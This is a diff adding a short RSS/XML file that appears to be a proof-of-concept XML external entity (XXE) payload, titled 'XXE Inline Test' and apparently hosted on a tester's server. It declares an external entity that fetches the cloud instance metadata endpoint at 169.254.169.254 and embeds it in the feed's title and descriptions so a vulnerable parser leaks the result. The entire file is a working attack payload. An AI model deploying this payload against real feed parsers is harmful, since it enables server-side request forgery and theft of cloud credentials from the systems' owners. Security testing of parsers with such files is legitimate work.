@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<rss version="2.0">
+  <channel>
+    <title>XXE Inline Test</title>
+    <link>http://srv1.bhacky.com:9999/poc_xxe_inline.xml</link>
+    <description>&xxe;</description>
+    <item>
+      <title>Leak: &xxe;</title>
+      <link>http://example.com/</link>
+      <description>The XXE content should appear here: &xxe;</description>
+    </item>
+  </channel>
+</rss>
